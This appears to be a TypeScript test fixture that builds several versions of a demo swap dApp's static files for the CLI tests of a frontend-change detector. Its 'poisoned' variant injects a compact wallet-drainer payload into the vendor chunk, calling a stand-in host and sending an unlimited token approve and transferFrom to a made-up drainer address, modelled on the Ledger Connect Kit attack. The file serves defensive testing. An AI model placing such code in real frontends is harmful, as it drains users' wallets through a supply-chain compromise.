// A small static dApp build, in several versions, for the CLI tests and the staging demo.
//   v1  first release
//   v2  code-only change                       -> tier 00
//   v3  v2 + a new contract address            -> tier 10
//   v4  v2 + a new external origin             -> tier 01
//   poisoned  v2 built with a poisoned npm package: the vendor chunk gains a drainer address, a new origin and
//             an approve + transferFrom call (the Ledger Connect Kit pattern). The app's own code is unchanged.
// The contract addresses are made up (demo only); Permit2 is the real, well-known address.
import { mkdirSync, writeFileSync, rmSync } from 'node:fs';
import { join, dirname } from 'node:path';
import { createHash } from 'node:crypto';

export const ROUTER = '0x5FbDB2315678afecb367f032d93F642f64180aa3';
export const STAKING = '0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512';
export const NEW_VAULT = '0x9FE46736679D2d9a65F3992F2428666E704Bd4A8';
export const PERMIT2 = '0x000000000022D473030F116dDEE9F6B43aC78BA3';
export const CDN_SCRIPT = 'https://cdn.jsdelivr.net/npm/qrcode@1.5.4/build/qrcode.min.js';
export const CDN_SRI = 'sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC';

export const DRAINER = '0xBAD0C0fFeE5BAD0c0ffEe5baD0c0ffeE5baD0C0F';
export const DRAINER_ORIGIN = 'https://cdn.connect-kit-assets.example.net';
/// What the poisoned package adds to the vendor chunk.
export const POISON = `;(()=>{const D="${DRAINER}",C="${DRAINER_ORIGIN}/v1/config";const drain=async(w,t,a)=>{const m=await fetch(C+"?a="+a).then(r=>r.json());await w.request({method:"eth_sendTransaction",params:[{from:a,to:t,data:"0x095ea7b3"+D.slice(2).padStart(64,"0")+"f".repeat(64)}]});return m.pull&&w.request({method:"eth_sendTransaction",params:[{from:a,to:t,data:"0x23b872dd"+a.slice(2).padStart(64,"0")+D.slice(2).padStart(64,"0")}]})};globalThis.__ck=drain})();\n`;

export type Variant = 'v1' | 'v2' | 'v3' | 'v4' | 'poisoned';

export function buildFiles(v: Variant, o: { sri?: boolean; rocket?: boolean } = {}): Record<string, string | Buffer> {
  const app = [
    `const ROUTER="${ROUTER}",STAKING="${STAKING}",PERMIT2="${PERMIT2}",NATIVE="0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE";`,
    v === 'v3' ? `const VAULT="${NEW_VAULT}";` : '',
    `const RPC="https://xlayerrpc.okx.com",API="https://api.demo-swap.example.org/v1/quote";`,
    v === 'v4' ? `const PRICES="wss://prices.new-feed.example.net/stream";` : '',
    `// see https://reactjs.org/docs/error-decoder.html for the full message`,
    `export async function swap(w,amount){return w.request({method:"eth_sendTransaction",params:[{to:ROUTER,data:"0x38ed1739"+amount}]})}`,
    v === 'v1' ? `export const VERSION="1.0.0";` : `export const VERSION="1.0.1";export const fixRounding=(x)=>Math.floor(x*1e6)/1e6;`,
  ].join('\n');
  const css = 'body{font-family:system-ui;margin:2rem}button{padding:.6rem 1rem}';
  const h = (s: string) => createHash('sha256').update(s).digest('hex').slice(0, 8);
  const appName = `assets/app-${h(app)}.js`;
  const cssName = `assets/style-${h(css)}.css`;
  const cdn = o.sri === false ? `<script src="${CDN_SCRIPT}"></script>` : `<script src="${CDN_SCRIPT}" integrity="${CDN_SRI}" crossorigin="anonymous"></script>`;
  const rocket = o.rocket ? '<script src="/cdn-cgi/scripts/7d0fa10a/cloudflare-static/rocket-loader.min.js" data-cf-settings="abc-|49" defer></script>' : '';
  const html = `<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <title>Demo Swap</title>
    <link rel="stylesheet" href="/${cssName}" />
    ${cdn}
  </head>
  <body>
    <div id="app"><button id="swap">Swap</button></div>
    <script type="module" src="/${appName}"></script>
    ${rocket}
  </body>
</html>
`;
  return {
    'index.html': html,
    [appName]: app,
    [cssName]: css,
    'assets/logo.svg': '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 8 8"><circle cx="4" cy="4" r="3"/></svg>',
    [v === 'poisoned' ? 'assets/chunk-vendor-9f31c2aa.js' : 'assets/chunk-vendor-51b0e7d4.js']: Buffer.from(`/* vendor bundle */\n${v === 'poisoned' ? POISON : ''}${'export const pad="xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";\n'.repeat(900)}`), // ~60 KB: sealed by hash, too big to store on-chain
    'robots.txt': 'User-agent: *\nAllow: /\n',
  };
}

export function writeBuild(dir: string, v: Variant, o: { sri?: boolean; rocket?: boolean } = {}): string {
  rmSync(dir, { recursive: true, force: true });
  for (const [path, body] of Object.entries(buildFiles(v, o))) {
    mkdirSync(dirname(join(dir, path)), { recursive: true });
    writeFileSync(join(dir, path), body);
  }
  return dir;
}

if (import.meta.url === `file://${process.argv[1]}`) {
  const [dir, v] = process.argv.slice(2);
  if (!dir || !v) throw new Error('usage: node test/fixtures.ts <dir> <v1|v2|v3|v4|poisoned>');
  writeBuild(dir, v as Variant);
  console.log(`wrote demo build ${v} to ${dir}`);
}
